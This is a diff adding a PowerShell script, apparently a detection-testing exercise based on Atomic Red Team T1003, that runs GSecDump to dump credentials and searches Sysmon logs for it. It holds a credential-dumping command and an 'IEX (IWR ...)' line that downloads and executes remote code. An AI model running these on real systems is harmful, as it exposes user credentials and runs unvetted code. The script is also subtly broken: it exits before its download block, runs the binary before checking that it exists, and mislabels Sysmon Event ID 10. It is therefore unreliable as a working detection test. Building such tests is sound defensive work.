@@ -1,0 +1,71 @@
+Attack 1: Credential Dumping (extracting user credentials)
+
+Source: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.md 
+
+# PowerShell script to attack using Atomic Red Team codes and detect in Sysmon
+
+# Function to simulate attack codes
+function Simulate-Attack {
+    param (
+        [string]$gsecdump_exe,
+        [string]$gsecdump_url,
+        [string]$gsecdump_bin_hash
+    )
+
+    # Run the GSecDump executable with the '-a' argument (simulate credential dumping)
+    & $gsecdump_exe -a
+
+    # Check if the GSecDump executable exists
+    if (Test-Path $gsecdump_exe) {
+        # Exit with code 0 if the executable is found (indicating success)
+        exit 0
+    } else {
+        # Exit with code 1 if the executable is not found (indicating failure)
+        exit 1
+    }
+
+    # Set security protocol to TLS 1.2 for secure downloads
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    # Get the parent path of the GSecDump executable
+    $parentpath = Split-Path $gsecdump_exe
+    # Define the path for the binary download
+    $binpath = "$parentpath\gsecdump-v2b5.exe"
+
+    # Download and verify the GSecDump executable script
+    IEX (IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+    
+    # Verify the hash of the downloaded binary
+    if (Invoke-WebRequestVerifyHash $gsecdump_url $binpath $gsecdump_bin_hash) {
+        # Move the verified binary to the final executable location
+        Move-Item $binpath $gsecdump_exe
+    }
+}
+
+# Function to detect credential dumping events in Sysmon logs
+function Detect-CredentialDumping {
+    # Check for Sysmon event logs related to credential dumping
+    # Event ID 10: Process command line execution
+    $logs = Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' |
+        Where-Object { $_.Id -eq 10 -and $_.Message -like "*gsecdump*" }
+
+    if ($logs) {
+        # If credential dumping events are found, output the logs
+        Write-Output "Credential dumping detected:"
+        $logs | Select-Object TimeCreated, Id, Message | Format-Table -AutoSize
+    } else {
+        # If no events are found, output a message indicating this
+        Write-Output "No credential dumping events detected."
+    }
+}
+
+# Define variables for the executable and URL
+$gsecdump_exe = "C:\Path\To\GSecDump.exe"  # Path to the GSecDump executable
+$gsecdump_url = "https://example.com/path/to/gsecdump.exe"  # URL to download GSecDump
+$gsecdump_bin_hash = "expected_hash_value"  # Expected hash value for verification
+
+# Execute the attack simulation
+Simulate-Attack -gsecdump_exe $gsecdump_exe -gsecdump_url $gsecdump_url -gsecdump_bin_hash $gsecdump_bin_hash
+
+# Call the detection function
+Detect-CredentialDumping
